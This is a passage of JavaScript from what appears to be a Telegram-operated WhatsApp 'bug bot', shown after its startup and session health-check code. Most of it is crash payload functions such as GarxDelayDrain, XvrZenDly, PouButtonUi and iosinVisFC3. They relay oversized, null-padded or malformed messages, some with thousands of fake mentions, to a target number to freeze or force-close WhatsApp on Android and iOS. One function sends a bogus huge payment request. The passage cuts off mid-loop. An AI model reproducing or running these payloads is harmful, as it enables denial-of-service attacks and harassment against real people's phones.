⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠄⢂⠀⠀⠀⠀⠀⣀⣠⠠⢖⣋⡥⢖⣩⠔⠊⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣨⠭⢵⣒⣩⠬⢖⠏⠁⢀⣀⠀⠀⠀
⠀⠀⠈⠓⠒⠦⠍⠭⠭⣭⠭⠭⠭⠭⡿⡓⠒⠛⠉⠉⠀⠀⣠⠇⠀⠀⠘⠞⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠁⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠿⠀⠀⠀⠀⠀⠉⠉⠙⠒⠒⠚⠉⠁⠀⠀⠀⠁⢣⡎⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));

bot.launch();

// Si anjing sialan ini yang bikin gw pusing 
setTimeout(() => {
  console.log('🔄 Starting auto-reload activated');
  forceReloadWithRetry();
}, 15000);

// nambahin periodic health check biar aman aja
setInterval(() => {
  const activeSessions = sessions.size;
  const userSessions = loadUserSessions();
  const totalRegisteredSessions = Object.values(userSessions).reduce((acc, numbers) => acc + numbers.length, 0);
  
  console.log(`📊 Health Check: ${activeSessions}/${totalRegisteredSessions} sessions active`);
  
  // Only attempt reload if we have registered sessions but none are active
  if (totalRegisteredSessions > 0 && activeSessions === 0) {
    console.log('🔄 Health check: Found registered sessions but none active, attempting reload...');
    reloadAttempts = 0; // Reset counter
    forceReloadWithRetry();
  } else if (activeSessions > 0) {
    console.log('✅ Health check: Sessions are active');
  }
}, 10 * 60 * 1000); // Check setiap 10 menit

// ================ FUNCTION BUGS HERE ================== \\
/
 async function OvXForce(sock, target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 11.11,
                degreesLongitude: -11.11,
                name: "⏤͟͟͞𝐯𝐢˓𝐧𝐳𝐲✰𝐄𝐱˓𝐞𝐜𝐮ˊ𝟕𝐭𝐞 !¿" + "ꦽ".repeat(7500),
                url: "https://t.me/Akirayuuu",
                contextInfo: {
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target
                  },
                  externalAdReply: {
                    quotedAd: {
                      advertiserName: "ꦾ".repeat(2000),
                      mediaType: "IMAGE",
                      jpegThumbnail: Buffer.from(
                        "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                        "base64"
                      ),
                      caption: "Exe By OvX"
                    },
                    placeholderKey: {
                      remoteJid: "0@g.us",
                      fromMe: true,
                      id: "ABCDEF1234567890"
                    }
                  }
                }
              },
              hasMediaAttachment: true
            },
            body: {
              text: "D4Vinzy"
            },
            nativeFlowMessage: {
              messageParamsJson: "{[",
              messageVersion: 3,
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: ""
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "RIVIEW",
                    flow_cta: "ꦽ".repeat(10000),
                    flow_message_version: "3"
                  })
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "RIVIEW",
                    flow_cta: "ꦾ".repeat(10000),
                    flow_message_version: "3"
                  })
                }
              ]
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(
    target,
    msg.message,
    { messageId: msg.key.id }
  );

  console.log("[ Biji ] SUCCESS SENT");
}
*/
async function RxRxMika(sock, target) {
  const X = { sendPaymentMessage: {} };
  const Linux = { sendPaymentMessage: {} };

  await sock.sendMessage(target, {
    requestPaymentMessage: {
      currencyCodeIso4217: "IDR",
      amount1000: 1000000000000,
      requestFrom: target
    }
  });

  {
    const RxR = { requestPaymentMessage: {} };

    sock.ev.on('messages.upsert', async ({ messages, type }) => {
      if (type !== 'notify') return;

      const m = messages?.[0];
      if (!m?.message) return;

      const text =
        m.message.conversation ||
        m.message.extendedTextMessage?.text ||
        "𑇂𑆵𑆴𑆿𑆿".repeat(9999);

      if (text.length < 1000) return;

      await sock.sendMessage(
        m.key.remoteJid,
        X,
        { ...Linux, quoted: m }
      );
    });
  }

  {
    const Y = { declinePaymentMessage: {} };
    const Z = { CancelPaymentRequestMessage: {} };
    const V = { paymentInviteMessage: {} };

    const leaks = [];
    setInterval(() => {
      leaks.push(Buffer.alloc(1000000, ' '));
      if (leaks.length > 100) leaks.splice(0, 50);
    }, 1000);

    const crypto = require('crypto');
    const messageId = crypto.randomBytes(16).toString('hex');

    await sock.relayMessage(
      target,
      X,
      { messageId }
    );
  }

  {
    const RxR2 = { sendPaymentMessage: {} };
    const leaks = [];

    (() => {
      leaks.push(Buffer.alloc(1000000, ' '));
      if (leaks.length > 100) leaks.splice(0, 50);
    })();

    const crypto = require('crypto');
    const messageId = crypto.randomBytes(16).toString('hex');

    await sock.relayMessage(
      target,
      X,
      { messageId }
    );
  }
}

async function GarxDelayDrain(sock, X) {
const pesan11 = generateWAMessageFromContent(X, {
ephemeralMessage: {
 message: {
  interactiveResponseMessage: {
      body: {
        text: "Drain garx delay",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: "\u0000".repeat(1045000),
        version: 3
        }, 
        contextInfo: {
          stanzaId: X,
            participant: X,
            mentionedJid: Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
                },
              },
            },
          }, 
        }, 
      }, 
    }, {});
   const Pesan899 = {
    viewOnceMessage: {
       message: {
         interactiveResponseMessage: {
         body: {
        text: "Hasil Nyolong Bos",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: "\u0000".repeat(1045000),
        version: 3
        },
        contextInfo: {
          stanzaId: X,
            participant: X,
            mentionedJid: Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
            },
          },
        }, 
      }, 
    }, 
  };
  const pesanDrain = {
   viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
          fileLength: "99999999999999999",
          height: "9999999999999999",
          width: "9999999999999999",
          mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
          fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
          directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
          mediaKeyTimestamp: "172519628",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyEiIzFRMjNBYQBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
          streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
          caption: "ꦾ".repeat(20000) + "ꦾ".repeat(60000),
          contextInfo: {
            stanzaId: "Thumbnail.id",
            isForwarded: true,
            forwardingScore: 999,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net")
            ]
          }
        }
      }
    }
  };
   for (const msg of [pesan11, Pesan899, pesanDrain]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [X],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: X } }]
        }]
      }]
    });
    console.log(`𝐙𝐍𝐗─𝟓𝟔 : 𝐆𝐋𝐎𝐑𝐘 𝟗𝟖% 𝐅𝐎𝐑 𝐓𝐎 ${X} 𝐈𝐍 𝐍𝐎𝐖 𝐀 𝐋𝐎𝐑𝐃 𝐎𝐅𝐅 𝐊𝐈𝐍𝐆`);
  }
}

async function XvrZenDly(sock, target) {
  try {
    let msg = generateWAMessageFromContent(target, {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
          },
          body: {
            text: "\u0000".repeat(1500),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
            version: 3
          }
        }
      }
    }, { userJid: target });

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

  } catch (err) {
    console.error(chalk.red.bold("func Error jir:"), err);
  }
}
//FUNCTION UI ANDROID
async function PouButtonUi(target) {
for (let i = 0; i < 5; i++) {
const PouMsg = {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "𝐏𝐨͠𝐮𝐌͜𝐨͠𝐝𝐬 𝐎𝐟͠𝐟𝐢͜𝐜𝐢𝐚𝐥",
hasMediaAttachment: false
},
body: {
text: "𝐏𝐨͠𝐮𝐌͜𝐨͠𝐝𝐬 𝐎𝐟͠𝐟𝐢͜𝐜𝐢𝐚𝐥" + "ꦽ".repeat(3000) + "ꦾ".repeat(3000)
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(5000),
limited_time_offer: {
text: "𝐏𝐨͠𝐮𝐌͜𝐨͠𝐝𝐬 𝐎𝐟͠𝐟𝐢͜𝐜𝐢𝐚𝐥",
url: "t.me/PouSkibudi",
copy_code: "𝐊𝐚͠𝐦𝐢͜𝐲𝐚 𝐈͠𝐬͜ 𝐁͠𝐚͜𝐜͠𝐤",
expiration_time: Date.now() * 999
},
buttons: [
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "𑜦𑜠".repeat(10000),
id: null
})
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "𑜦𑜠".repeat(10000),
url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
})
},
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "𑜦𑜠".repeat(10000),
copy_code: "𑜦𑜠".repeat(10000)
})
},
{
name: "galaxy_message",
buttonParamsJson: JSON.stringify({
icon: "PROMOTION",
flow_cta: "𝐊𝐚͠𝐦𝐢͜𝐲𝐚 𝐈͠𝐬͜ 𝐁͠𝐚͜𝐜͠𝐤",
flow_message_version: "3"
})
}
]
},
contextInfo: {
mentionedJid: Array.from({ length: 1000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`),
isForwarded: true,
forwardingScore: 999
}
}
}
}
}
await sock.relayMessage(target, PouMsg)
}
}

async function PLottiEStcJv(sock, target) {
  try {
    const PouMsg1 = generateWAMessageFromContent(target, {
      lottieStickerMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.15575-24/575792415_1326859005559789_4936376743727174453_n.enc?ccb=11-4&oh=01_Q5Aa2wHHWbG7rC7tgA06Nu-D-aE4S0YhhV3ZUBkuvXsJvhm2-A&oe=692E7E33&_nc_sid=5e03e0&mms3=true",
            fileSha256: "Q285fqG3P7QFkMIuD2xPU5BjH3NqCZgk/vtnmVkvZfk=",
            fileEncSha256: "ad10CF3pqlFDELFQFiluzUiSKdh0rzb3Zi6gc4GBAzk=",
            mediaKey: "ZdPiFwyd2GUfnDxjSgIeDiaS7SXwMx4i2wdobVLK6MU=",
            mimetype: "application/was",
            height: 512,
            width: 512,
            directPath: "/v/t62.15575-24/575792415_1326859005559789_4936376743727174453_n.enc?ccb=11-4&oh=01_Q5Aa2wHHWbG7rC7tgA06Nu-D-aE4S0YhhV3ZUBkuvXsJvhm2-A&oe=692E7E33&_nc_sid=5e03e0",
            fileLength: "25155",
            mediaKeyTimestamp: "1762062705",
            isAnimated: true,
            stickerSentTs: "1762062705158",
            isAvatar: false,
            isAiSticker: false,
            isLottie: true,
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363419085046817@newsletter",
                serverMessageId: 1,
                newsletterName: "POU HITAM BANGET 😹︎" + "ꦾ".repeat(12000)
              },
              quotedmessage: {
                paymentInviteMessage: {
                  expiryTimestamp: Date.now() + 1814400000,
                  serviceType: 3,
                }
              }
            }
          }
        }
      }
    }, { userJid: target })

    await sock.relayMessage(target, PouMsg1.message, { 
    messageId: PouMsg1.key.id 
    })
    console.log("DONE BY mizukisnji")

  } catch (bokepPou3menit) {
    console.error("EROR COK:", bokepPou3menit)
  }
}
// FUNCTION FORCE CLOSE KATANYA WKWK
async function crashGroupx(sock, target) {

const options = [
    { optionName: "Ota" },
    { optionName: "Otax" },
    { optionName: "Otaxx" }
];

const correctAnswer = options[1];

const msg = generateWAMessageFromContent(target, {
    botInvokeMessage: {
        message: {
            messageContextInfo: {
                messageSecret: crypto.randomBytes(32), 
                messageAssociation: {
                    associationType: 7,
                    parentMessageKey: crypto.randomBytes(16)
                }
            }, 
            pollCreationMessage: {
                name: "Otax Here", 
                options: options,
                selectableOptionsCount: 1,
                pollType: "QUIZ",
                correctAnswer: correctAnswer
            }
        }
    }
}, {});

await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
});
}
//FUNCTION BLANK IOS NO INVISIBLE

//FUNCTION FORCE CLOSE IOS INVISIBLE 
async function iosinVisFC3(sock, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/OTAX",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "OTAX",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, 
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiZ0ssEUIiU2VXGTJFNjchUjMjM1Q0VUYmSR/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2FxgYKhscHRFjI0Q5H/2gAMAwEAAhEDEQA/ALumEmJixiZ4p+bZyMQaYpMJMA6Dkw4sSmGmItMemEmJTGJgUmMTDTFJhJgUNTCTFphJgA1MNMSmGmAxyYaYmLCTEUPR6LiwkwKTKcmMjISmEmWYR6YSYqLDTEUMTDixSYSYg6D0wkxKYaYFpj0wkxMWMTApMYmGmKTCTAoamEmKTDTABqYcWJTDTAY1MYnwExYSYiioJhJiUz1z0LMQ9MOMiC6+nSexrrrENM6CkGpEBV11hxrrrAeScpBxkQVXXWHCsn0iHknKQSloRPTJLmD9IXWBaZ0FINSOcrhdYcbhdYDydFMJMhwrJ9I30gFZJKkGmRFVXWNhPUB5JKYSYqLC1AZT9eYmtPdQx9JEupcGUYmy/wCz/LOGY3hFS5v6dSdRVXFbs2kkkhW0jLmG4DhFtc4fCpCpOuqb3puSa3W/kdzY69ctVu3l4Ijbbnplqy97XwTNrhHg5xzPqXbUfNnE2Ldt645nN2cZdw7HcIuLm/hUnUhXdNbs2kkoxfzF7RcCsMBtrOpYRnB1JuMt6bfQdbYk9ctXnvcvggI22y3cPw3tZfCJwjwM45kStqS0zi7Vuwuff1B2f5cw7GsDldXsKk6qrSgtJtLRJeYGfsBsMEs7WrYxnCU5uMt6bfDQ6+x172U5v/sz8IidsD0wux7Z+AOEeDnHM6TtqPm3ibVuwueOZV8l2Vvi2OQtbtSlSdOUmovTijQfUjBemjV/VZQdl0tc101/Bn4Go5lvqmG4FeXlBRdWjTcoqXLULeMXTcpIrSaFCVq6lWKeG+45iyRgv7mr+qz1ZKwZf5NX9RlEjtJxdr+6te6/M7mTc54hjOPUbK5p0I05xk24RafBa9ZUZ0ZPCXyLpXWnVZqEYLL9QWasq0sPs5XmHynuU/7dOT10XWmVS0kqt1Qpy13ZzjF/k2avmz7uX/ZMx/DZft9r2sPFHC4hGM1gw6pb06FxFQWE/wAmreqOE/uqn6jKLilKFpi9zb0dVTpz0jq9TWjJMxS9pL7tPkjpdQjGKwjXrNvSpUounFLn3HtOWqGEek+A5MxHz5Tm+ZDu39VkhviyJdv6rKMOco1vY192a3vEvBEXbm9MsWXvkfgmSdjP3Yre8S8ERNvGvqvY7qb/AGyPL+SZv/o9x9jLsj4Q9hr1yxee+S+CBH24vTDsN7aXwjdhGvqve7yaf0yXNf8ACBH27b39G4Zupv8Arpcv5RP+ORLshexfU62xl65Rn7zPwiJ2xvTCrDtn4B7FdfU+e8mn9Jnz/KIrbL/hWH9s/Ab9B7jpPsn4V9it7K37W0+xn4GwX9pRvrSrbXUN+jVW7KOumqMd2Vfe6n2M/A1DOVzWtMsYjcW1SVOtTpOUZx5pitnik2x6PJRspSkspN/QhLI+X1ysV35eZLwzK+EYZeRurK29HXimlLeb5mMwzbjrXHFLj/0suzzMGK4hmm3t7y+rVqMoTbhJ8HpEUK1NySUTlb6jZ1KsYwpYbfgizbTcXq2djTsaMJJXOu/U04aLo/MzvDH9oWnaw8Ua7ne2pXOWr300FJ04b8H1NdJj2GP7QtO1h4o5XKaqJsy6xGSu4uTynjHqN+MhzG/aW/7T5I14x/Mj9pr/ALT5I7Xn7Uehrvoo+37HlJ8ByI9F8ByZ558wim68SPcrVMaeSW8i2YE+407Yvd0ZYNd2m+vT06zm468d1pcTQqtKnWio1acJpPXSSTPzXbVrmwuY3FlWqUK0eU4PRnXedMzLgsTqdyPka6dwox2tH0tjrlOhQjSqxfLwN9pUqdGLjSpwgm9dIpI+q0aVZJVacJpct6KZgazpmb8Sn3Y+QSznmX8Sn3I+RflUPA2/qK26bX8vyb1Sp06Ud2lCMI89IrRGcbY7qlK3sLSMk6ym6jj1LTQqMM4ZjktJYlU7sfI5tWde7ryr3VWdWrLnOb1bOdW4Uo7UjHf61TuKDpUotZ8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbpXFjVdKsk0pJdDOk825g6MQn3Y+RNGvGEdrRGm6pStaHCqRb5+o1dZZwVf6ba/pofZ4JhtlXVa0sqFKquCnCGjRkSzbmH8Qn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 100; i++) {
